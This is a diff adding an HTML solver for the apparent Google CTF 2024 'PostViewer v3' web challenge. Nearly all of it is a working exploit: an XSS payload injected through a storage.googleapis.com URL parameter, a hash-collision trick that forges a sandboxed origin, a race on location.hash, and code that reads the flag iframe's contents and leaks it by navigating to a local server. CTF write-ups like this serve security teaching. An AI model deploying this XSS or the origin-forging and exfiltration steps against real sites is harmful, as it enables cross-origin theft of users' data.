@@ -1,0 +1,176 @@
+<html>
+<meta charset="utf-8">
+<title>Solver|PostViewer v3</title>
+
+</html>
+
+<body>
+
+  <!--
+    This solution uses an XSS on storage.googleapis.com but it can be also
+    solved by uploading the PoC to Cloud Storage.
+  -->
+  <iframe name="XSS"
+    src="https://storage.googleapis.com/vrview/2.0/index.html?image=%3Cstyle/onload='onmessage=e=>eval(e.data);parent.postMessage(1337,`*`)'%3E">
+  </iframe>
+  <script>
+    const params = new URL(location).searchParams;
+    const CHALL_ORIGIN = params.get('local') ? 'http://localhost:1337' : 'https://postviewer3-web.2024.ctfcompetition.com';
+
+    // Spawn an opener and point it to the challenge app.
+    if (!opener || opener.closed) {
+      var x = window.open(location.href);
+      if (!x || x.closed) {
+        document.write('Popup was blocked. Please click anywhere');
+        onclick = () => {
+          var x = window.open(location.href);
+        }
+      }
+      throw /no opener/;
+    }
+    opener.location = `${CHALL_ORIGIN}/#`;
+
+    // Copied property from the challenge app.
+    const evaluatorHtml = atob("CjxodG1sPgogIDxoZWFkPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPHRpdGxlPkV2YWx1YXRvcjwvdGl0bGU+CgogICAgPHNjcmlwdD4KICAgICAgb25tZXNzYWdlID0gZSA9PiB7CiAgICAgICAgaWYoZS5zb3VyY2UgIT09IHBhcmVudCkgewogICAgICAgICAgdGhyb3cgL25vdCBwYXJlbnQvOwogICAgICAgIH07CiAgICAgICAgaWYoZS5kYXRhLmV2YWwpewogICAgICAgICAgZXZhbChlLmRhdGEuZXZhbCk7CiAgICAgICAgfQogICAgICB9CiAgICAgIG9ubG9hZCA9ICgpID0+IHsKICAgICAgICBwYXJlbnQucG9zdE1lc3NhZ2UoJ2xvYWRlciByZWFkeScsJyonKTsKICAgICAgfQogICAgPC9zY3JpcHQ+CgogICAgPHN0eWxlPgogICAgICBib2R5ewogICAgICAgIHBhZGRpbmc6IDBweDsKICAgICAgICBtYXJnaW46IDBweDsKICAgICAgfQogICAgICBpZnJhbWV7CiAgICAgICAgd2lkdGg6IDEwMHZ3OwogICAgICAgIGhlaWdodDogMTAwdmg7CiAgICAgICAgYm9yZGVyOiAwOwogICAgICB9CiAgICAgIC5zcGlubmVyIHsKICAgICAgICBiYWNrZ3JvdW5kOiB1cmwoaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL2djdGYtcG9zdHZpZXdlci9zcGlubmVyLnN2ZykgY2VudGVyIG5vLXJlcGVhdDsKICAgICAgfQogICAgICAuc3Bpbm5lciBpZnJhbWV7CiAgICAgICAgb3BhY2l0eTogMC4yCiAgICAgIH0KICAgIDwvc3R5bGU+CiAgPC9oZWFkPgogIDxib2R5PgogICAgPGRpdiBpZD0iY29udGFpbmVyIiBjbGFzcz0ic3Bpbm5lciI+PC9kaXY+CiAgPC9ib2R5Pgo8L2h0bWw+Cg==")
+    function arrayToBase36(arr) {
+      return arr
+        .reduce((a, b) => BigInt(256) * a + BigInt(b), BigInt(0))
+        .toString(36);
+    }
+
+    // Copied method from the challenge app.
+    async function calculateHash(...strings) {
+      const encoder = new TextEncoder();
+      const string = strings.join("");
+      const hash = await crypto.subtle.digest("SHA-256", encoder.encode(string));
+      return arrayToBase36(new Uint8Array(hash)).padStart(50, "0").slice(0, 50);
+    }
+    // Modifier method from the challenge app, with adjusting for the solution.
+    async function safeFrameRender(body, salt) {
+      const url = new URL(CHALL_ORIGIN);
+      const hash = await calculateHash(body, '', "https://storage.googleapis.com", salt);
+      url.host = `sbx-${hash}.${url.host}`;
+      /*
+        The pathname results in an empty product since the regex allows for 0 characters.
+      */
+      url.pathname = "a//shim.html";
+      url.searchParams.set("o", "https://storage.googleapis.com");
+
+      var iframe = document.createElement("iframe");
+      iframe.name = 'safeframe';
+      iframe.src = url;
+      document.body.appendChild(iframe);
+      await new Promise(resolve => {
+        iframe.addEventListener("load", () => { resolve(); }, { once: true });
+      });
+      return { safeFrame: iframe, safeFrameOrigin: url.origin };
+    }
+
+    // Sleep promise.
+    const sleep = d => new Promise(r => setTimeout(r, d));
+
+    // A promise that resolves once we can execute arbitrary JS on storage.googleapis.com
+    const xssLoaded = new Promise(resolve => {
+      onmessage = e => {
+        if (e.data === 1337) {
+          resolve();
+        }
+      }
+    });
+
+    async function poc() {
+      // Wait 2 seconds for the challenge app to load.
+      const delay = sleep(2000);
+      /*
+        The challenge app calculates the hash by concatenating four strings.
+          sha256(body + product + origin + salt) where:
+            body == evaluatorHtml
+            product == 'postviewer'
+            origin == 'https://postviewer3-web.2024.ctfcompetition.com/'
+            salt == 'https://postviewer3-web.2024.ctfcompetition.com/#aaaaaaaaaaa'
+
+        The goal is to calculate the same hash from different values, which is
+        the case for:
+          body == evaluatorHtml.split('https://storage.googleapis.com')[0]
+          product = ''
+          origin = 'https://storage.googleapis.com'
+          salt == evaluatorHtml.split('https://storage.googleapis.com')[1] +
+                  'postviewer' + 'https://postviewer3-web.2024.ctfcompetition.com/' +
+                  'https://postviewer3-web.2024.ctfcompetition.com/#aaaaaaaaaaa'
+
+        The first half of the evaluatorHtml contains the script that allows
+        to execute arbitrary JS from a parent window. Because salt is simply
+        transferred via postMessage it fills the missing part of the file.
+      */
+      const [body, rest] = evaluatorHtml.split('https://storage.googleapis.com');
+      const salt = rest + "postviewer" + CHALL_ORIGIN + `${CHALL_ORIGIN}/#aaaaaaaaaaa`;
+
+      // Wait for the two iframes and the opener window to load.
+      await Promise.all([safeFrameRender(body, salt), delay, xssLoaded]);
+
+      /*
+        The challenge app allows displaying a first file via #0 which then changes
+        the hash to #file-<sha1(file_name)>. The filename of the flag is random
+        so it's not possible to predict the hash. This hash is also used in
+        generation of the origin of the iframe where the flag is being displayed.
+        To solve the challenge, the attacker needs to either know that value
+        or to influence it, which is what the below code does. In an infinite
+        loop, the code tries to win a race-condition where the location.hash is
+        quickly changed from '#file-<sha1(file_name)>' to '#aaaaaaaaaaa' forcing
+        the hash calculation method to only use the latter.
+      */
+      while (true) {
+        /* If there is opener[0][0] that means the race was won. */
+        if (opener.length > 0 && opener[0]?.length == 1) {
+          break;
+        }
+        opener.location = `${CHALL_ORIGIN}/#` + Math.random();
+        /* Schedules two very close tasks that will fight for location.hash */
+        setTimeout(() => {
+          opener.location = `${CHALL_ORIGIN}/#0`;
+        }, 100);
+        setTimeout(() => {
+          opener.location = `${CHALL_ORIGIN}/#aaaaaaaaaaa`;
+        }, 101);
+        await sleep(300);
+      }
+      /*
+        Submits half of the evaluatorHtml to our safeFrame as
+        storage.googleapis.com origin. Any other Origin would have been rejected.
+      */
+      XSS.postMessage(`parent.safeframe.postMessage({
+        mimeType: "text/html; charset=utf-8",
+        body: atob("${btoa(body)}"),
+        salt: atob("${btoa(salt)}"),
+      },'*');`, '*');
+
+      window.addEventListener('message', async e => {
+        // Voila, leak the flag!
+        if (e.data.flag) {
+          console.log(e.data.flag);
+          // Leak the flag via navigation.
+          const url = new URL('http://localhost:9999');
+          url.searchParams.set('flag', e.data.flag);
+          location = url;
+          return;
+        }
+
+        /*
+          Since flag's outer iframe is same origin to our safeFrame it's possible
+          to leak the blob URL of the inner iframe, fetch its contents and then
+          leak the flag.
+        */
+        if (e.data == 'loader ready') {
+          safeframe.postMessage({
+            eval: 'fetch(top.opener[0].document.querySelector("iframe").src).then(e=>e.text()).then(flag=>parent.postMessage({flag},"*"))'
+          }, '*');
+        }
+      });
+    }
+
+    poc();
+
+  </script>
+</body>
+
+</html>
